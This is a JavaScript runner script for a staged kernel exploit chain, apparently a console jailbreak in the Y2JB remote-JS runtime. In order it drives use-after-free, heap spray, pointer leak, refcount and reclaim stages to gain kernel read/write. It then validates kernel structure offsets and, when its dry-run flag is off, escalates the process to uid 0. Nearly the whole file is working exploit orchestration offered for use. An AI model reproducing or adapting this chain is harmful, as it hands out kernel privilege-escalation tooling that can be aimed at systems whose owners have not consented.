// y2jb_run.js -- staged bagagwa runner for the Y2JB remote-JS runtime.
// Concatenated AFTER y2jb_head.js + engine body. Auto-runs on load.
// DRY_RUN=true (default): stages 0-4 + read-only OFF validation, stage 5
// SKIPPED. Set false only after a green validation to actually jailbreak.
(async () => {
    const LOG_HOST = "192.168.0.163"; // <-- your Mac IP
    const DRY_RUN = true;
    const note2 = (s) => { try { log("[bgw-run] " + s); } catch (e) {} };
    const milestone = (s) => { try { send_notification(s); } catch (e) {} };
    try { LOG_SERVER = "http://" + LOG_HOST + ":8080/log"; } catch (e) {}
    try { if (typeof checkLogServer === "function") await checkLogServer(); } catch (e) {}

    function isKPtr(v) {
        return v !== null && v !== undefined && ((v.hi >>> 16) === 0xFFFF);
    }
    function hx(v) {
        if (v === null || v === undefined) return "null";
        return "0x" + (v.hi >>> 0).toString(16) + (v.low >>> 0).toString(16).padStart(8, "0");
    }

    // Read-only OFF gate: runs after stage 4 (kread live), before stage 5.
    // ZERO kernel writes. Fail => stage 5 stays blocked, whatever DRY_RUN is.
    async function y2jb_validate(engine) {
        const checks = [], fail = [];
        const pass = (n, ok, d) => {
            checks.push({ name: n, ok: !!ok, detail: d || "" });
            if (!ok) fail.push(n);
        };
        const OFF = engine.OFF, S = engine.S;
        pass("s4.curproc-set", isKPtr(S.curproc), hx(S.curproc));
        pass("s4.fdOfiles-set", isKPtr(S.fdOfiles), hx(S.fdOfiles));
        pass("s4.pipes-set", isKPtr(S.masterPipeData) && isKPtr(S.victimPipeData),
            hx(S.masterPipeData) + " " + hx(S.victimPipeData));
        if (fail.length) return { ok: false, checks, failed: fail };
        try {
            const cp = await engine.findCurproc();
            pass("proc.pid-getpid", cp.ok, cp.ok ? ("pid=" + cp.pid) : cp.why);
            if (cp.ok) {
                const pid = await engine.kread32Fast(S.curproc.add32(OFF.PROC_PID));
                pass("proc.pid-kread", pid.ret === 4 && pid.v === cp.pid,
                    "ret=" + pid.ret + " kread=" + pid.v + " getpid=" + cp.pid);
            }
        } catch (e) { pass("proc.pid-getpid", false, String((e && e.message) || e)); }
        const uc = await engine.kread64Fast(S.curproc.add32(OFF.PROC_UCRED));
        pass("proc.ucred-ptr", uc.ret === 8 && isKPtr(uc.v), "ret=" + uc.ret + " " + hx(uc.v));
        if (uc.ret === 8 && isKPtr(uc.v)) {
            const u = uc.v;
            const uid = await engine.kread32Fast(u.add32(OFF.UCRED_CR_UID));
            const ng = await engine.kread32Fast(u.add32(OFF.UCRED_CR_NGROUPS));
            pass("ucred.uid", uid.ret === 4 && uid.v >= 0 && uid.v <= 60000, "ret=" + uid.ret + " v=" + uid.v);
            pass("ucred.ngroups", ng.ret === 4 && ng.v >= 0 && ng.v <= 1024, "ret=" + ng.ret + " v=" + ng.v);
        }
        const fd = await engine.kread64Fast(S.curproc.add32(OFF.PROC_FD));
        pass("proc.fd-ptr", fd.ret === 8 && isKPtr(fd.v), "ret=" + fd.ret + " " + hx(fd.v));
        if (fd.ret === 8 && isKPtr(fd.v)) {
            const cd = await engine.kread64Fast(fd.v.add32(OFF.FD_CDIR));
            const rd = await engine.kread64Fast(fd.v.add32(OFF.FD_RDIR));
            pass("fd.cdir", cd.ret === 8 && isKPtr(cd.v), "ret=" + cd.ret + " " + hx(cd.v));
            pass("fd.rdir", rd.ret === 8 && isKPtr(rd.v), "ret=" + rd.ret + " " + hx(rd.v));
        }
        if (S.masterRfd >= 0) {
            const fp = await engine.fgetFast(S.masterRfd);
            pass("fget.master", fp.ret === 8 && isKPtr(fp.v), "ret=" + fp.ret + " " + hx(fp.v));
            if (fp.ret === 8 && isKPtr(fp.v)) {
                const fdata = await engine.kread64Fast(fp.v.add32(OFF.FILE_F_DATA));
                pass("file.f_data", fdata.ret === 8 && isKPtr(fdata.v), "ret=" + fdata.ret + " " + hx(fdata.v));
            }
        }
        for (const c of checks) note2("  " + (c.ok ? "PASS " : "FAIL ") + c.name + " " + c.detail);
        return { ok: fail.length === 0, failed: fail };
    }

    async function runStage(engine, name, fn) {
        note2("--- " + name + " ---");
        const r = await fn();
        for (const s of (r.steps || [])) note2("  " + s);
        if (!r.ok) note2(name + " FAILED: " + r.why);
        else note2(name + " OK");
        return r;
    }

    try {
        milestone("bgw: alive, baseline next");
        note2("alive, calling getpid baseline");
        const pid0 = await syscall(0x14n);
        note2("baseline getpid=" + String(pid0));
        try {
            if (typeof is_jailbroken === "function") note2("baseline is_jailbroken=" + String(await is_jailbroken()));
        } catch (e) { note2("is_jailbroken check skipped"); }

        const ctx = y2jb_make_context();
        const engine = makeBagagwaEngine(ctx);
        milestone("bgw: engine up, stage 0");

        const s0 = await runStage(engine, "stage0_uaf", () => engine.stage0_uaf());
        if (!s0.ok) { milestone("bgw: stage 0 FAILED"); return; }
        const s1 = await runStage(engine, "stage1_spray", () => engine.stage1_spray());
        if (!s1.ok) { milestone("bgw: stage 1 FAILED"); return; }
        const s2 = await runStage(engine, "stage2_leak", () => engine.stage2_leak());
        if (!s2.ok) { milestone("bgw: stage 2 FAILED"); return; }
        const s3 = await runStage(engine, "stage3_refcount", () => engine.stage3_refcount());
        if (!s3.ok) { milestone("bgw: stage 3 FAILED"); return; }
        const s4 = await runStage(engine, "stage4_reclaim", () => engine.stage4_reclaim());
        if (!s4.ok) { milestone("bgw: stage 4 FAILED"); return; }
        milestone("bgw: kernel R/W up, validating OFF");

        note2("--- OFF validation (read-only, gates stage 5) ---");
        const v = await y2jb_validate(engine);
        if (!v.ok) {
            note2("OFF VALIDATION FAILED: " + v.failed.join(","));
            milestone("bgw: OFF mismatch, stage 5 blocked");
            return;
        }
        note2("OFF validation passed");

        if (DRY_RUN) {
            note2("DRY RUN COMPLETE: s0-s4 green, validator green, stage 5 SKIPPED.");
            note2("To jailbreak: set DRY_RUN=false in y2jb_run.js and re-send.");
            milestone("bgw: DRY RUN green, stage 5 skipped");
            return;
        }

        const s5 = await runStage(engine, "stage5_jailbreak", () => engine.stage5_jailbreak());
        if (!s5.ok) { milestone("bgw: stage 5 FAILED"); return; }
        note2("=== JAILBREAK COMPLETE === uid " + s5.before.uid + " -> " + s5.after.uid +
            " getuid()=" + s5.after.getuid + " writes=" + engine.kernelWrites);
        milestone("bgw: JAILBROKEN uid=0");
    } catch (e) {
        note2("FATAL: " + ((e && e.stack) || (e && e.message) || String(e)));
        try { send_notification("bgw: FATAL, see log"); } catch (_) {}
    }
})()
